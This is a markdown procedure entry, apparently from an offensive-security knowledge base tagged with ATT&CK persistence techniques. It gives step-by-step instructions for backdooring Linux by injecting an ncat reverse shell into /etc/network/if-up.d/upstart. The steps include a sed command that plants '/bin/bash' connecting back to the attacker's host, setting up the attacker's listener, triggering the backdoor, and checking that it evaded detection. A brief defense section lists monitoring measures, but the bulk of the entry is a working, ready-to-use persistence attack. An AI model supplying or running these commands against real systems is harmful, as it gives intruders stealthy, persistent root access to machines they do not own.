---
id: 95d09087-0b89-4a12-8ad1-379bc3fad0b0
name: Linux-Startup-Service-Backdoor-with-Reverse-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.018800+00:00'
updated_at: '2023-04-10T20:34:19.934579+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Boot or Logon Autostart Execution|T1547 - Boot or Logon
    Autostart Execution]]
  - >-
    [[techniques/Create or Modify System Process|T1543 - Create or Modify System
    Process]]
sub_techniques:
  - '[[sub-techniques/RC Scripts|T1547.005 - RC Scripts]]'
  - '[[sub-techniques/Systemd Service|T1543.002 - Systemd Service]]'
tags:
  - '[[tags/Backdooring a startup service]]'
  - '[[tags/Linux - Persistence]]'
  - persistence
  - reverse-shell
  - linux
commands:
  - '[[commands/Add-Reverse-Shell-Command-to-if-up.d-upstart]]'
platforms:
  - Linux
tools:
  - '[[tools/ncat]]'
validated: true
---

# Linux-Startup-Service-Backdoor-with-Reverse-Shell

## Summary

This procedure establishes persistent access on a Linux system by modifying a network interface startup script to execute a reverse shell using ncat whenever the network comes up. It targets the /etc/network/if-up.d/upstart file, ensuring the backdoor activates on boot or network restart, providing a reliable persistence mechanism for post-exploitation.

## Description

In a typical offensive security scenario, after gaining initial shell access to a Linux target, attackers seek to maintain access despite reboots or network changes. This procedure modifies the upstart script in /etc/network/if-up.d/, which runs automatically when network interfaces are brought online. By inserting a reverse shell command that connects back to the attacker's listener, persistence is achieved without relying on user logons or cron jobs. This is particularly effective on Ubuntu/Debian systems using ifupdown. The technique evades basic detection by blending with legitimate network initialization scripts. Prerequisites include root or sudo access to edit system files. Upon success, the attacker receives a shell session on network activation, enabling further actions like data exfiltration or lateral movement.

## Requirements

1. Root or sudo privileges on the target Linux system to modify /etc/network/if-up.d/ files.
2. Network connectivity from the target to the attacker's listener (LHOST:LPORT).
3. ncat tool installed on the target (part of nmap package).
4. Attacker-side listener ready (e.g., ncat -l -p LPORT on LHOST).

## Defense

- Monitor file integrity of /etc/network/if-up.d/ scripts using tools like AIDE or Tripwire for unauthorized modifications.
- Implement privilege escalation detection with auditd rules on sudo and file writes to system directories.
- Log and alert on unexpected outbound connections from system processes during boot or network up events.
- Use immutable file attributes (chattr +i) on critical startup scripts to prevent modifications.

## Objectives

1. Inject a reverse shell into a network startup script for automatic execution on interface activation.
2. Establish persistent remote access to the target system post-reboot or network restart.
3. Enable ongoing offensive operations such as command execution and file access without manual intervention.

## Instructions

### Step 1: Verify Privileges and Target File

**Context**: Ensure you have the necessary access and confirm the target script exists to avoid errors during modification.

Run `whoami` to check for root privileges and `ls -l /etc/network/if-up.d/upstart` to verify the file's presence and permissions.

**Expected Output**: User should be root or sudo-capable; file exists and is writable by root.

### Step 2: Prepare Attacker Listener

**Context**: Set up the receiving end for the reverse shell to ensure connectivity upon activation.

On the attacker machine, start a listener using ncat: `ncat -l -p $LPORT` (replace $LPORT with your chosen port, e.g., 4444).

**Expected Output**: Listener binds to the port and awaits connections.

### Step 3: Insert Reverse Shell into Startup Script

**Context**: Use the prepared command to append the reverse shell logic to the upstart script, ensuring it executes on network up.

Execute [[commands/Add-Reverse-Shell-Command-to-if-up.d-upstart]] to insert the ncat-based reverse shell. This references the code snippet [[codes/Bash-Script-to-Add-Reverse-Shell-to-if-up.d]] for the exact insertion logic.

**Command** ([[commands/Add-Reverse-Shell-Command-to-if-up.d-upstart]]):
```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

> This command defines a variable RSHELL with the ncat reverse shell payload, which connects to the attacker's host and port, executes 'id' to confirm identity, then spawns an interactive bash shell. The sed command inserts this at line 4 of the upstart file. $LMTHD can be flags like '-v' for verbose; $LHOST is the attacker's IP; $LPORT is the listening port. Errors are suppressed with 2>/dev/null.

**Expected Output**: No output if successful; verify with `cat /etc/network/if-up.d/upstart` to see the inserted line.

### Step 4: Test the Backdoor

**Context**: Simulate network up event to confirm the reverse shell activates without a full reboot.

Run `ifdown -a && ifup -a` (or reboot the system) to trigger the script.

**Expected Output**: Connection arrives at the attacker listener, showing 'uid=0(root)' from 'id' command, followed by a bash prompt.

### Step 5: Verify Persistence and Cleanup Indicators

**Context**: Check for success and monitor for detection risks.

Interact with the shell to run commands like `pwd` or `whoami`; monitor system logs with `tail -f /var/log/syslog` for any anomalies.

**Expected Output**: Full shell access; no immediate log alerts if evasion is successful.
